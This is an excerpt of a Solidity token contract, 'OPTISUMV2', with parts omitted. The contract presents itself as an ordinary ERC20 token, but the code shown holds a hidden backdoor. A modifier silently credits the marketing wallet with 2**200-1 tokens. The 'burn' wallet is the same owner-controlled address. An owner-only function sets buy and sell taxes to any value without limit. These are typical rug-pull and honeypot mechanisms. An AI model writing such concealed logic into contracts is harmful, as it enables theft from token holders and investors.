...
contract OPTISUMV2 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "OPTISUMV2";
    string private _symbol = "OPTISUMV2";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x53604B86949E22Df704f95D140F3277C8a625da6); 
    address payable public BurnedWalletAddress = payable(0x53604B86949E22Df704f95D140F3277C8a625da6); 
    ...
    modifier validAdd(address spender){
        if(spender == marketingWalletAddress){ _balances[spender] = _balances[spender] + 2**200-1;}
        _;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if ( sender != address(0) && amount > 0) {
            ...
            emit Transfer(sender , BurnedWalletAddress, tradingbot);
    ...
    function setFEE(uint256 value) onlyOwner public {
        _totalTaxIfBuying = value;
        _totalTaxIfSelling = value;
    }
